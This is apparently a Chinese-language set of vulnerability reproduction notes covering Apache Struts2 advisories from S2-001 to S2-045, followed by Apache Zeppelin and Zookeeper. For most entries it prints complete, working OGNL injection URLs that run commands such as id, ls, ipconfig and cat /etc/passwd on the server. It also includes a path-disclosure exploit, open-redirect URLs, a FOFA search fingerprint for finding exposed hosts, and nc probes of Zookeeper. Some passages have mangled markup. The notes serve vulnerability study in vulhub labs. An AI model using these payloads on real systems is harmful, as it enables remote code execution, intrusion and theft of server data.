构造结果中包含的参数值可以注入未转义的双引号，从而可以通过转义已渲染的href属性来在生成的HTML中注入代码。 当includeParams设置为none的任何其他值时，和标签无法转义标签，可以通过使用GET参数调用包含JSP /动作来利用\n影响版本 Struts2 2.0.0 ~ 2.0.11\n漏洞复现 POC：\nhttp://:/index.action?\"alert(1):/index.action?alert(1)test=hello\rStruts2 S2-003 XWork ParameterInterceptors旁路允许OGNL语句执行 CVE-2008-6504 漏洞描述 S2-003 - Apache Struts 2 Wiki - Apache Software Foundation\nOGNL提供了广泛的表达式评估功能，可以使攻击者绕过ParameterInterceptor内置的#使用保护，从而能够操纵服务器端上下文对象。\n如，要将#session.user设置为oopsdc，可以使用以下参数名称：\n('\\ u0023'+'session 'user ' ')(未使用)= oopsdc\r经URL编码后会如此显示：\n('\\ u0023'％20％2b％20'session 'user \\ '))(未使用)= oopsdc\r影响版本 Structs 2.0.0 ~ 2.0.11.2\n漏洞复现 S2-003算是S2-005的前身，其POC为S2-005的缩小版，因为S2-003之后官方修改了安全配置，默认让SecurityMemberAccess(管理OGNL权限的类)的allowStaticMethodAccessz值为false。\n这里把S2-005的POC去掉\u0026('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(bla)(bla)这句话。\n?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)\u0026('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)\u0026('\\u0023mycmd\\u003d\\'ipconfig\\'')(bla)(bla)\u0026('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)\u0026(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))\u0026(B)(('\\u0023myres\\u003dnew\\40byte[51020]')(bla))\u0026(C)(('\\u0023mydat.readFully(\\u0023myres)')(bla))\u0026(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)')(bla))\u0026('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)\u0026(E)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla))\r测试URL：\nhttp://:8080/showcase.action\r修改后URL：\nhttp://:/showcase.action?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)\u0026('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)\u0026('\\u0023mycmd\\u003d\\'ipconfig\\'')(bla)(bla)\u0026('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)\u0026(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))\u0026(B)(('\\u0023myres\\u003dnew\\40byte[51020]')(bla))\u0026(C)(('\\u0023mydat.readFully(\\u0023myres)')(bla))\u0026(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)')(bla))\u0026('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)\u0026(E)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla))\r直接执行ipconfig命令。\nStruts2 S2-004 提供静态内容时的目录遍历漏洞 CVE-2008-6505 漏洞描述 S2-004 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-005 XWork ParameterInterceptors旁路允许RCE 漏洞描述 S2-005 - Apache Struts 2 Wiki - Apache Software Foundation\n通过unicode编码\\u0023绕过struts对#的过滤,再通过设置xwork.MethodAccessor.denyMethodExecution为false、memberAccess.allowStaticMethodAccess为true来绕过沙盒。\n影响版本 Apache Struts 2.0.0 ~ 2.1.8.1\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git\rcd vulhub/struts2/s2-005\rdocker-compose up -d\rPOC：\n/example/HelloWorld.action?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29\u0026%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29\u0026%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29\u0026%28%27%5Cu0023mycmd%5Cu003d%5C%27id%5C%27%27%29%28bla%29%28bla%29\u0026%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29\u0026%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29\u0026%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29\u0026%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29\u0026%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29\u0026%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29\u0026%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29\r更改POC中的id值就能执行任意指令。\nStruts2 S2-006 XWork的多个XSS生成错误页面 漏洞描述 S2-006 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-007 出现转换错误时，用户输入被评估为OGNL表达式 CVE-2012-0838 漏洞描述 S2-007 - Apache Struts 2 Wiki - Apache Software Foundation\n当项目配置了验证规则、类型转换出错时，会造成错误的字符串拼接，进而造成了OGNL语句的执行。后端用代码拼接 \"'\" + value + \"'\" 并对其进行 OGNL 表达式解析，类似SQL注入单引号闭合，官方修复时使用escape 对单引号转义，也跟SQL注入比较相似，。\n影响版本 Apache Structs 2.0.0 ~ 2.2.3\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-007 docker-compose up -d # 我默认进入路径显示404，使用如下路径即可 # http：//:/index.jsp 随便给name、email两个属性赋值，age使用如下Payload，bp抓取提交后的请求包，发送到Repeater模块：\n' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + ' 在响应包中查看age的input标签，值就是我们执行的id命令的结果。\ninput type=\"text\" name=\"age\" value=\"uid=0(root) gid=0(root) groups=0(root) \" id=\"user_age\"/ Structs2 S2-008 Struts2中的多个关键漏洞 CVE-2012-0391 漏洞描述 S2-008 - Apache Struts 2 Wiki - Apache Software Foundation\n漏洞主要利用系统未对传入参数进行严格限制的缺陷，导致多个地方可执行恶意代码。\n第一种情况是S2-007，在异常处理时的OGNL执行。\n第二种情况是cookie，虽然Struts2没有对恶意代码进行限制，但Java的webserver(Tomcat)对cookie名称有较多限制，在传入Struts2之前就被处理。\n第三种情况需要开启devModedebug模式。\n影响版本 Apache Struts 2.1.0 ~ 2.3.1\n复现思路 第三种情况，使用devMode的debug模式造成任意代码执行。\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-008 docker-compose up -d POC：\nhttp://:8080/S2-008/devmode.action?debug=command\u0026expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)\r回显为null。\nhttp://:8080/S2-008/devmode.action?debug=command\u0026expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29\r成功执行id命令。\nStruts2 S2-009 ParameterIntercetptor远程命令执行漏洞 漏洞描述 S2-009 - Apache Struts 2 Wiki - Apache Software Foundation\n跟S2-003、S2-005属于同一种类型，Structs2对S2-003的修复方法是禁止#号，S2-005通过使用编码\\u0023或\\43绕过。Struts2对S2-005的修复方法是禁止\\等特殊符号。\n但如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以我们可将OGNL表达式放在example参数中，然后使用/HelloWorld.action?example=\u0026(example)('xxx')=1的方法来执行，绕过官方的限制。\n影响版本 Apache Structs 2.1.0 ~ 2.3.1.1\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-009 docker-compose up -d POC：\nhttp://:/ajax/example5?age=123\u0026name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29\u0026z[%28name%29%28%27meh%27%29]=true\r在服务器创建/tmp/success文件，无回显。\nhttp://:/ajax/example5.action?age=123\u0026name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)\u0026z[(name)(%27meh%27)]\r执行ls命令并下载结果文件。\nStruts S2-010 使用Struts2令牌机制进行CSRF保护时，可能会因滥用已知会话属性绕过检查 漏洞描述 S2-010 - Apache Struts 2 Wiki - Apache Software Foundation\n影响版本 Apache Struts 2.0.0 ~ 2.3.4\nStruts2 S2-011 长请求参数名称可能会显著提高DOS攻击有效性 漏洞描述 S2-011 - Apache Struts 2 Wiki - Apache Software Foundation\n影响版本 Apache Struts 2.0.0 ~ 2.3.4\nStruts2 S2-012 展示应用程序漏洞允许远程命令执行 CVE-2013-1965 漏洞描述 S2-012 - Apache Struts 2 Wiki - Apache Software Foundation\n若在配置Action中Result使用了重定向类型，且使用${param_name}作为重定向变量，如：\n name=\"S2-012\" extends=\"struts-default\"  name=\"user\" class=\"com.demo.action.UserAction\"  name=\"redirect\" type=\"redirect\"/index.jsp?name=${name}  name=\"input\"/index.jsp  name=\"success\"/index.jsp   UserAction中定义了一个name变量，当触发redirect类型返回时，Structs2获取使用${name}获取它的值，在这个过程中会对name参数的值执行OGNL表达式解析导致可以插入任意OGNL表达式导致命令执行。\n影响版本 Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2 \n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-012 docker-compose up -d URL：\nhttp://:/index.jsp\rPOC：\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"cat\", \"/etc/passwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\rbp抓包看回显。\nStruts2 S2-013 URL和锚标记的includeParams属性中存在的远程命令执行漏洞 CVE-2013-1966 漏洞描述 S2-013 - Apache Struts 2 Wiki - Apache Software Foundation\nstruts的标签中s:a和s:url都有一个includeParams属性：\nnone\t:\tURL中不包含任何参数(默认)\rget\t:\t仅包含URL中的GET参数\rall\t:\t在URL中包含GET和POST参数\r当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。 本来urldecode一下就能得到params，但struts给OGNL解析，造成了任意代码执行。\n影响版本 Struts 2.0.0 ~ 2.3.14\n漏洞复现 POC：\nhttp://:/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D\rStruts2 S2-014 强制参数包含在URL和锚标记中引入的漏洞允许远程命令执行、会话访问操作及XSS攻击 CVE-2013-1966 CVE-2013-2115 漏洞描述 S2-014 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts中和标签都包含includeParams属性，其值可设为none、get或all，含义如下：\nnone\t：\t链接不包含请求的任意参数值(默认)\rget\t：\t链接只包含GET请求中的参数和值\rall\t：\t链接包含GET和POST所有参数和值\r包含特殊请求参数的请求可用来向堆栈注入任意OGNL代码，被用于URL或A标签中的请求参数。当includeParams=all时，会将本次请求的GET和POST参数都放在URL的GET参数上造成任意命令执行漏洞。\nS2-014是对S2-013修复的加强，修复了S2-013代码中忽略的${ognl_exp} OGNL表达式的方式。\n影响版本 Struts 2.0.0 ~ 2.3.14.1\n漏洞复现 POC：\nhttp://:/link.action?a=${(#_memberAccess[\"allowStaticMethodAccess\"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}\r或\nhttp://:/link.action?a=${#_memberAccess[\"allowStaticMethodAccess\"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}\rStruts2 S2-015 通配符匹配机制引入的漏洞或OGNL表达式的双重评估导致的远程命令执行漏洞 CVE-2013-2134 CVE-2013-2135 漏洞描述 S2-015 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2允许在通配符的基础上定义动作映射，例：\n name=\"*\" class=\"example.ExampleSupport\" /example/{1}.jsp  如果一个请求不匹配任何已定义当作，则将被*匹配，请求的动作名将用于被加载基于动作名的JSP文件。\n影响版本 Struts 2.0.0 ~ 2.3.14.2\n漏洞复现 POC：\nhttp://:/example/%25%7B1%2B1%7D.action\rMessage为/2.jsp。\n%24%7B%23context%5B%27xwork%2EMethodAccessor%2EdenyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23%5FmemberAccess%2EgetClass%28%29%2EgetDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m%2EsetAccessible%28true%29%2C%23m%2Eset%28%23%5FmemberAccess%2Ctrue%29%2C%23q%3D%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%27id%27%29%2EgetInputStream%28%29%29%2C%23q%7D%2Eaction\r执行id命令，Message处为执行结果。\nStruts2 S2-016 通过操作前缀action:、redirect:、redirectAction:参数造成远程命令执行漏洞 CVE-2013-2251 漏洞描述 S2-016 - Apache Struts 2 Wiki - Apache Software Foundation\nDefaultActionMapper类支持以action:、redirect:、redirectAction:作为导航或重定向前缀，但这些后缀后面同时可以跟OGNL表达式，Struts2并未对这些前缀做过滤，导致利用OGNL表达式调用Java静态方法执行任意系统命令。\n简而言之就是：在对特殊URL处理中，redirect与redirecrAction后跟上OGNL表达式会被服务器执行。\n影响版本 Struts 2.0.0 ~ 2.3.15\n漏洞复现 POC：\nhttp://:/index.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D\r执行了id命令，结果回显在URL。\nredirect:%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%6c%73%27%2c%27%2f%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d\r执行ls命令，结果以文件返回。\n爆路径EXP：\nhttp://:/index.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D\rStruts2 S2-017 通过操作前缀redirect:、redirectAction:参数引入漏洞允许打开重定向 CVE-2013-2248 漏洞描述 S2-017 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2的DeaultActionMapper曾支持一种短路导航状态改变的方法，即在参数前加redirect:、redirectAction:，再加上想要跳转的目标表达式。本来这种机制的目的是方便把导航信息附加到表单中的按钮上，但可以很容易的用来重定向到任意位置。\n影响版本 Struts 2.0.0 ~ 2.3.15\n漏洞复现 POC：\nhttp://:/showcase.action?redirect:http://oopsdc.tk/\rhttp://:/fileupload/upload.action?redirect:http://oopsdc.tk/\rhttp://:/modelDriven/modelDriven.action?redirectAction:http://oopsdc.tk/\rStruts2 S2-018 访问控制漏洞 S2-018 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-019 默认情况下禁用动态方法调用 CVE-2016-0785 漏洞描述 S2-019 - Apache Struts 2 Wiki - Apache Software Foundation\nS2-019漏洞利用条件极为严格：\n特殊代码、value值为空、可传参到value、可控制name\n代码执行过程大致为如下：\n先尝试获取value的值，若为空，则二次解释执行了name，且在执行前给name加上了%{}，最终造成二次执行。\n漏洞影响 Struts 2.0.0 ~ 2.3.24.1 (2.3.20.3除外)\n漏洞复现 特殊代码如下：\ns:i18n name=\"%\u0026#123#request.lan\u0026#125\"xxxxxs:i18n set var=\"%\u0026#123#parameters.tang3\u0026#125\"/ 通过%\u0026#123#\u0026#125的方式获取用户输入标签属性，导致代码执行。之后的修复方式为直接过滤%\u0026#123\u0026#125形式的字符串OGNL解析。\n//core/src/main/java/org/apache/struts2/components/Component.java protected Object findValue(String expr, Class toType) { if (altSyntax() \u0026\u0026 toType == String.class) { if (altSyntax() \u0026\u0026 toType == String.class) { - return TextParserUtil.translateVariables('%', expr, stack); + if (ComponentUtils.containsExpression(expr)) { + return TextParserUtil.translateVariables('%', expr, stack); + } else { + return expr; + } } else {} else { expr = stripExpressionIfAlySyntax(expr); expr = stripExpressionIfAlySyntax(expr); //core/src/main/java/org/apache/struts2/components/Component.java + * @param expr to treat as an expression * @return true if it is an expression * @return true if it is an expression */ */ - public static boolean isExpression(Object value) { + public static boolean isExpression(String expr) { - String expr = value.toString(); return expr.startsWith(\"%{\") \u0026\u0026 expr.endsWith(\"}\"); return expr.startsWith(\"%{\") \u0026\u0026 expr.endsWith(\"}\"); } } + public static boolean containsExpression(String expr) { + return expr.contains(\"%{\") \u0026\u0026 expr.endsWith(\"}\"); + } 以上述代码为例，修改后的代码处理掉了非%\u0026#123开头，\u0026#125结尾的字符串进行OGNL解析的功能，举个例子：\nbar%\u0026#1232+3\u0026#125，在修改之前的代码中2+3会被作为OGNL执行。而修改之后，这种形式就只会被当做字符串来返回。\n审计方法就是查看是否存在以%\u0026#123#\u0026#125方式获取用户输入变量赋值给标签属性的代码写法。\n测试代码：\n@page import=\"java.util.HashSet\"% @page contentType=\"text/html;charset=UTF-8\" language=\"java\"% @taglib prefix=\"s\" uri=\"/struts-tags\"% html head titleTest JSP Page/title /head body request.setAttribute(\"a\", \"'),#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=@java.lang.Runtime@getRuntime(),#a.exec('touch /tmp/th1s_1s_test'),new java.lang.String('\");% s:i18n name=\"%\u0026#123#request.lan\u0026#125\"xxxxx/s:i18n /body /html URL：\nhttp://:/index.jsp?a=1\r生成tmp/th1s_1s_test。\nStruts2 S2-020 将Commons FileUpload升级到版本1.3.1(避免DoS攻击)并添加’class’以排除ParametersInterceptor中的params(避免ClassLoader操作) S2-020 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-021 改进ParametersInterceptor和CookieInterceptor中被排除的参数，以避免ClassLoader操作 S2-021 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-022 在CookieInterceptor中扩展排除的params以避免操纵Struts的内部 S2-022 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-023 可预测令牌生成值 S2-023 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-024 错误的excludeParams覆盖DefaultExcludedPatternsChecker中的定义值 S2-024 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-025 调试模式和公开的JSP文件中的跨站点脚本漏洞 S2-025 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-026 特殊的可用于访问Struts内部的顶级对象 S2-026 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-027 TextParseUtil.translateVariables未过滤恶意OGNL表达式 S2-027 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-028 使用具有损坏的URLDecoder实现的JRE可能会导致基于Struts 2的Web应用程序中的XSS漏洞 S2-028 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-029 在标记属性中对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行 S2-029 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-030 I18NInterceptor中可能的XSS漏洞 S2-030 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-031 XSLTResult解析任意样式表漏洞 S2-031 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-032 使用动态方法调试时，可通过前缀执行远程代码 CVE-2016-3081 漏洞描述 S2-032 - Apache Struts 2 Wiki - Apache Software Foundation\n可使用mothod：Action前缀调用声明为publicd的函数，但在低版本中不会对name方法值做OGNL计算。\n影响版本 Struts 2.3.20 ~ 2.3.28 (2.3.20.3、2.3.24.3除外)\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-012 docker-compose up -d URL：\nhttp://:/index.jsp\r开启动态方法调用，使用?method：execute方法调用execute方法(struts2默认的action调用方法)，在method后加上要执行的OGNL表达式即可执行任意代码。\nPOC：\nhttp://:/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString\u0026pp=%5C%5CA\u0026ppp=%20\u0026encoding=UTF-8\u0026cmd=id\rhttp://:/index.action?method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString\u0026cmd=id\u0026dd=%20\u0026d=____A\u0026encoding=UTF-8\r回显id命令结果。\nStruts2 S2-033 开启动态调试且使用REST插件时可导致远程代码执行 漏洞描述 S2-033 - Apache Struts 2 Wiki - Apache Software Foundation\n当开启动态调试并同时使用Struts2 REST Plugin插件时，使用!操作符调用动态方法可能执行OGNL表达式，从而导致远程代码执行。\n影响版本 Struts 2.3.20 ~ 2.3.28 (2.3.20.3、2.3.24.3除外)\n漏洞复现 POC：\n%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?\u0026command=id\r回显id命令结果。\nStruts2 S2-034 OGNL缓存中毒导致的DoS漏洞 S2-034 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-035 易出错的行动名称清理 S2-035 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-036 在标签属性对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行漏洞(类似S2-029) S2-036 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-037 使用REST插件时可实现远程代码执行 漏洞描述 S2-037 - Apache Struts 2 Wiki - Apache Software Foundation\n与S2-033类似，S2-037也是关于REST插件导致method变量被篡改造成的远程代码执行漏洞，S2-037也是在DefaultApplicationInvocation.java的invokeAction方法中没有对methodName参数进行校验，直接放到getValue方法中，从而造成OGNL表达式的注入。\n影响版本 Struts 2.3.20 ~ 2.3.28.1(2.3.20.3、2.3.24.3除外)\n漏洞复现 POC：\n/orders/4/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?\u0026obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse\u0026content=7556\u0026command=id\r回显id命令执行结果。\nStruts2 S2-045 基于Jakarta Multipart解析器执行文件上载时可能的远程执行代码 漏洞描述 S2-045 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts使用的Jakarta解析文件上传请求包不当，当攻击者构造恶意Content-Type时，可能导致远程代码执行。\n在default.properties文件中，struts.multipart.parser的值有两个选择，分别是jakarta和pell(原本也有第三种选择cos)。其中，jakarta解析器是Struts2框架的标准组成部分，默认情况下被启动。\n影响版本 Struts 2.3.5 ~ 2.3.31\nStruts 2.5 ~ 2.5.10\nZeppelin 未授权任意命令执行漏洞 漏洞描述 Apache Zeppelin存在未授权用户访问命令执行接口，导致容易用户可执行恶意命令获取服务器权限。\n影响版本 Apache Zeppelin\n漏洞复现 FOFA：icon_hash=\"960250052\"\n含有漏洞的页面能够通过页面创建一个新的匿名用户，创建之后即可执行任意命令。\nZookeeper 未授权访问漏洞 CVE-2014-085 漏洞描述 默认安装配置好的Zookeeper允许未授权访问，管理员未配置访问控制列表(ACL)，导致攻击者可以在默认开放的2181端口下通过执行envi命令获得大量敏感信息(系统名称、java环境)导致任意用户可以在网络不受限的情况下进行未授权访问读取数据。\n影响版本 Apache Zookeeper\n复现思路 漏洞复现 Zookeeper默认开放2181端口，使用如下命令获取敏感信息：\necho envi | nc xxx.xxx.xxx.xxx 2181 1、stat：列出关于性能和连接的客户端的统计信息。 echo stat | ncat  2181 